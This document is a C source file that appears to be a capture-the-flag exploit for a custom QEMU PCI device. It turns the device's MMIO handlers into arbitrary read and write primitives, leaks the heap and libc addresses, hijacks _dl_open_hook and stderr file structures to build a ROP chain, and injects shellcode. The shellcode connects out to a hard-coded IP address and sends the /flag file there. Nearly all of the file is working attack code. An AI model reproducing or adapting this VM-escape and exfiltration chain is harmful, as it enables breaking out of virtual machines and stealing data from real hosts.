#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <inttypes.h>
#include <sys/syscall.h>

#define MAX_CARROT_NUM 4
#define MAX_CARROT_WEIGHT 15
#define BATTERIES_NUM 4
#define MAX_BATTERY_POWER 1300
#define MAX_BOTTLE_CAPACITY 2000

#define LIQUID_TYPE_NONE 0
#define LIQUID_TYPE_WATER 1
#define LIQUID_TYPE_LAVA 2

#define RESOURCE_TYPE_CARROT 0xca
#define RESOURCE_TYPE_FLASHLIGHT 0xf1
#define RESOURCE_TYPE_BOTTLE 0xb0
#define RESOURCE_TYPE_BATTERY 0xba

unsigned char *mmio_mem;

uint32_t carrot_id = 0;

void mmio_write(uint16_t addr, uint16_t value) {
    *(uint16_t *)(mmio_mem + addr) = value;
}

uint16_t mmio_read(uint16_t addr) {
    return *(uint16_t *)(mmio_mem + addr);
}

uint16_t get_carrot_weight(uint16_t index) {
    uint16_t addr = (index << 8) | 0x0;
    return mmio_read(addr);
}

uint16_t get_battery_num_in_flashlight() {
    return mmio_read(0x2);
}

uint16_t get_liquid_type() {
    return mmio_read(0x4);
}

void plant_carrot(uint8_t index) {
    mmio_write(0x0, index);
}

void eat_carrot(uint8_t index) {
    mmio_write(0x2, index);
}

void charge_flashlight() {
    mmio_write(0x4, 0xdd);

}

void turn_on_flashlight(uint16_t power) {
    mmio_write(0x6, power);
}

void fill_bottle_with_liquid(uint8_t liquid_type) {
    mmio_write(0x8, liquid_type);
}

void drink_or_remove_liquid(uint16_t volume) {
    mmio_write(0xa, volume);

}

void discard_resource(uint8_t type) {
    mmio_write(0xc, type);
}

void set_address(uint64_t address) {

    while (1) {
        discard_resource(RESOURCE_TYPE_CARROT);
        carrot_id = 0;

        plant_carrot(carrot_id++);
        eat_carrot(MAX_CARROT_NUM);
        plant_carrot(carrot_id);

        uint8_t weight = get_carrot_weight(carrot_id);
        /* If weight == 6, then the bottle->liquid becomes 0x0000ffffffffffff */
        if (weight == 6) {
            /* Check whether carrots[i] == bottle == flashlight */
            turn_on_flashlight(0);
            uint8_t weight2 = get_carrot_weight(carrot_id);
            if (weight != weight2) { // carrots[1] and bottle and flashlight overlap 
                break;
            } else { // carrots[1] and bottle does not overlap
                continue;
            }
            break;
        }

        fill_bottle_with_liquid(LIQUID_TYPE_NONE);

        if (weight >= 11) {
            drink_or_remove_liquid(MAX_BOTTLE_CAPACITY);
            charge_flashlight();
        } else {
            drink_or_remove_liquid(MAX_BOTTLE_CAPACITY & 0xff);
            charge_flashlight();
        }
    } 
    
    /* set &bottle->liquid using turn_on_flashlight */
    uint16_t consume_power_0 = 0xffff - (address & 0xffff);
    uint16_t consume_power_1 = 0xffff - ((address >> 16) & 0xffff);
    uint16_t consume_power_2 = 0xffff - ((address >> 32) & 0xffff);

    fill_bottle_with_liquid(LIQUID_TYPE_NONE);
    turn_on_flashlight(consume_power_2);
    drink_or_remove_liquid(MAX_BOTTLE_CAPACITY & 0xff00);
    turn_on_flashlight(consume_power_1);
    drink_or_remove_liquid(MAX_BOTTLE_CAPACITY & 0xff);
    turn_on_flashlight(consume_power_0);
}

uint64_t arb_read_64(uint64_t address) {
    uint64_t result = 0;

    set_address(address + 7);

    for (uint8_t i = 0; i < 8; i++) {
        uint64_t leak = get_liquid_type();
        result |= leak << ((7 - i) << 3);
        if (i < 7) {
            turn_on_flashlight(1);
        }
    }
    return result;
}

void arb_write_8(uint64_t address, uint8_t value) {
    set_address(address);
    fill_bottle_with_liquid(value);
}

void arb_write_64(uint64_t address, uint64_t value) {
    for (uint8_t i = 0; i < 8; i++) {
        uint8_t byte = (value >> (i << 3)) & 0xff;
        arb_write_8(address + i, byte);
    }
}

int main() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1) {
        fprintf(stderr, "[!] open error\n");
        exit(1);
    }
    mmio_mem = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmap_error\n");
        exit(1);
    }
    setpriority(PRIO_PROCESS, 0, -20);


    // let extra_battery = 0
    charge_flashlight();
    turn_on_flashlight(MAX_BATTERY_POWER * BATTERIES_NUM);
    charge_flashlight();
    turn_on_flashlight(MAX_BATTERY_POWER * BATTERIES_NUM);

    plant_carrot(carrot_id++); // now 6 chunks in tcache[0x20]
    eat_carrot(MAX_CARROT_NUM); // now 7. Also, carrots[MAX_CARROT_NUM] == flashlight
    fill_bottle_with_liquid(LIQUID_TYPE_NONE); 

    drink_or_remove_liquid(MAX_BOTTLE_CAPACITY); // There's a high chance that malloc returns flashlight

    /* Now bottle is the same as flashlight. */
    /* Furthermore, extra_batteries is set to 1 */

    charge_flashlight(); // set extra_batteries to 0

    /* bottle->liquid is the same as flashlight->batteries */
    /* Leak bottle->liquid address */
    uint64_t heap_leak = 0;
    for (uint8_t n = 3; n > 0; n--) {
        /* decrease flashlight one at a time until `get_battery_num_in_flashlight` returns different number */
        for (uint64_t i = 0; i < 0x10000; i++) {
            uint8_t battery_num = get_battery_num_in_flashlight();
            if (n != battery_num) {
                if (n == 1) {
                    // battery[3] is charged, so need to subtract MAX_BATTERY_POWER
                    heap_leak |= (i - MAX_BATTERY_POWER) << ((3 - n) << 4);
                } else {
                    heap_leak |= i << ((3 - n) << 4);
                }
                break;
            }
            turn_on_flashlight(1);
        }
    }

    /* Calculate tcache address */
    uint64_t tcache_addr = heap_leak & 0x7fffff000000 | 0x8c0;
    printf("[*] tcache = %p\n", tcache_addr);

    /* Scan tcahe[0x30] and get heap address */
    uint64_t mmap_heap_addr = tcache_addr;
    uint64_t tcache_0x30 = arb_read_64(tcache_addr + 0x98);
    for (int i = 0; i < 4; i++) {
        tcache_0x30 = arb_read_64(tcache_0x30);
    }

    //uint64_t heap_base = tcache_0x30 - 0x2e3a20;
    //uint64_t heap_base = tcache_0x30 - 0x2e1920;
    uint64_t heap_base = tcache_0x30 - 0x2e3740;
    uint64_t heap_addr = heap_base;

    printf("[*] heap base = %p\n", heap_addr);

    /* Leak libc address */
    /* Hunt the chunk that contains libglib address */

    uint64_t libc_base = 0;
    while (1) {
        uint64_t size = arb_read_64(heap_addr + 0x8);
        printf("Heap address, size = %p, %p\n", heap_addr, size);

        if (size == 0x401) {
            uint64_t g_str_hash_addr = arb_read_64(heap_addr + 0x48);
            //libc_base = g_str_hash_addr - 0x394f80;
            libc_base = g_str_hash_addr - 0x3923d0;
            break;
        }
        heap_addr += size & (~0xfULL);
    }

    printf("[*] libc base = %p\n", libc_base);

    /* libc rop gadgets! */
    uint64_t _dl_open_hook = libc_base + 0x1c4368;
    uint64_t mov_rax_qword_ptr_call = libc_base + 0x137870;
    uint64_t mov_r12_rdi_call = libc_base + 0x10ad92;
    uint64_t mov_rdx_rax_call_r12 = libc_base + 0x1067ff;
    uint64_t setcontext = libc_base + 0x4b725;
    uint64_t syscall_ret = libc_base + 0x580da;
    uint64_t pop_rax_ret = libc_base + 0x3ee88;
    uint64_t jmp_rax = libc_base + 0x26fb5;
    uint64_t new_rsp = libc_base + 0x1c2000;

    uint64_t _IO_file_jumps_overflow = libc_base + 0x1c04b8;
    uint64_t _IO_2_1_stderr_ = libc_base + 0x1bf5c0;
    uint64_t argp_program_version_hook_0x20 = libc_base + 0x1c2f80;

    /* Open flag, Read flag, Send flag to my server
     * ; s = socket(2, 1, 0)
     * push 0x29
     * pop rax ; rax = 0x66
     * cdq ; rdx = 0
     * push 0x2
     * pop rdi ; rdi = 2
     * xor rsi, rsi
     * inc rsi
     * syscall

     * ; connect(s, [2, 31337, 178.128.18.122], 16), change it to your own IP:port
     * xor rdi, rdi
     * push 0x2a
     * pop rax
     * mov rbx, 0x7a1280b2697a0002 ; change this to your own ip & port
     * push rbx
     * push rsp
     * pop rsi
     * push 0x10
     * pop rdx
     * syscall

     * ; open("/flag", O_RDONLY, 0)
     * push 0x2
     * pop rax
     * mov rbx, 0x67616c662f
     * push rbx
     * mov rdi, rsp
     * xor rsi, rsi
     * xor rdx, rdx
     * syscall

     * ; read(0, buff, 0x80)
     * xor rax, rax
     * xor rdi, rdi
     * inc rdi
     * lea rsi, [rsp + 0x2000]
     * push 0x80
     * pop rdx
     * syscall

     * ; write(sockfd, buff, len)
     * xchg rax, rdx
     * xor rax, rax
     * inc rax
     * xor rdi, rdi
     * lea rsi, [rsp + 0x2000]
     * syscall

     * ; exit(0)
     * push 0x3c
     * pop rax
     * xor rdi, rdi
     * syscall
     *
     */

    char sc[] = "\x6a\x29\x58\x99\x6a\x02\x5f\x48\x31\xf6\x48\xff\xc6\x0f\x05\x48\x31\xff\x6a\x2a\x58\x48\xbb\x02\x00\x7a\x69\xb2\x80\x12\x7a\x53\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x58\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x31\xc0\x48\x31\xff\x48\xff\xc7\x48\x8d\xb4\x24\x00\x20\x00\x00\x68\x80\x00\x00\x00\x5a\x0f\x05\x48\x92\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\x8d\xb4\x24\x00\x20\x00\x00\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05";
    uint8_t sc_len = 118;
    uint64_t sc_addr = libc_base + 0x480000;
    uint64_t map_len = 0x2000;
    uint64_t rwx = 0x7;

    for (uint8_t i = 0; i < sc_len; i++) {
        arb_write_8(sc_addr + i, sc[i]);
    }

    /* _dl_open_hook & _IO_2_1_stderr_ */
    arb_write_64(_dl_open_hook, _dl_open_hook + 0x10);
    arb_write_64(_dl_open_hook + 0x10, mov_r12_rdi_call);
    arb_write_64(argp_program_version_hook_0x20, mov_rdx_rax_call_r12);
    arb_write_64(_IO_2_1_stderr_ + 0x20, setcontext - 1);
    arb_write_64(_IO_2_1_stderr_ + 0x28, setcontext);
    arb_write_64(_IO_file_jumps_overflow, mov_rax_qword_ptr_call);

    /* setcontext */
    arb_write_64(_dl_open_hook + 0x78, sc_addr); // rdi
    arb_write_64(_dl_open_hook + 0x80, map_len); // rsi
    arb_write_64(_dl_open_hook + 0x98, rwx); // rdx
    arb_write_64(_dl_open_hook + 0xb0, new_rsp); // new rsp
    arb_write_64(_dl_open_hook + 0xb8, pop_rax_ret); // return address

    /* mprotect */
    arb_write_64(new_rsp, __NR_mprotect);
    arb_write_64(new_rsp + 0x8, syscall_ret);
    arb_write_64(new_rsp + 0x10, pop_rax_ret);
    arb_write_64(new_rsp + 0x18, sc_addr);
    arb_write_64(new_rsp + 0x20, jmp_rax);

    printf("[*] Done. Exit qemu to trigger the rop & shellcode\n");
}
